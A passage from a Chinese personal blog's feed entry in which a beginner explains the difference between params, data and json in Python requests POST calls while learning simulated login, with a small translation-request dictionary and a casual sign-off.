class="line">       <span class="built_in">print</span>(response.json)</span><br></pre></td></tr></table></figure><p>因为这里比较疑惑data和params有什么区别，通过资料了解到这是两种携带参数的方法。</p><p>简单来说，params是用来发送查询字符串，而data、json是用来发送正文的。<br>这两种参数post方法都可以用，get方法只能发查询字符串，不能发送正文。</p><p>params会将参数key、value拼接在url后；<br>json 表示使用application/json方式提交请求。接收方request.body的内容为’{“a”: 1, “b”: 2}’的这种形式；<br>data 表示使用application/form-urlencode方式提交请求，接收方request.body的内容为a=1&amp;b=2的这种形式。</p><h3 id="需要注意的"><a href="#需要注意的" class="headerlink" title="需要注意的"></a>需要注意的</h3><p>其实请求里使用python字典要包括的东西很多（大概），第一次写也没完全了解大概需要去放些什么东西在请求头和包里，就抓到啥放啥）</p><p>请求头里可能还需要time out，accept之类的，补充一点互联网上捞到的看看。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">time_str = <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="number">1000</span> * time.time()))</span><br><span class="line">key_dict = &#123;</span><br><span class="line">    <span class="string">&quot;source&quot;</span>: <span class="string">&quot;zh&quot;</span>,</span><br><span class="line">    <span class="string">&quot;target&quot;</span>: <span class="string">&quot;en&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sourceText&quot;</span>: <span class="string">&quot;发送 POST 请求&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sessionUuid &quot;</span>: <span class="string">&quot;translate_uuid&quot;</span> + time_str</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><p>摆烂人要为了自己兢兢业业捏</p><p>今天听的是RISE</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Target = <span class="string">&#x27;have fun and rise&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(Target)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;start&quot;&gt;&lt;a href=&quot;#start&quot; class=&quot;headerlink&quot; title=&quot;start&quot;&gt;&lt;/a&gt;start&lt;/h2&gt;&lt;p&gt;在写模拟登录的时候需要用到python request模块，并且要抓包发包，只能说一无所知，甚至不知道url是什么。</summary>
      
    
    
    
    
    <category term="first" scheme="http://example.com/tags/first/"/>
    
  </entry>
  
</feed>
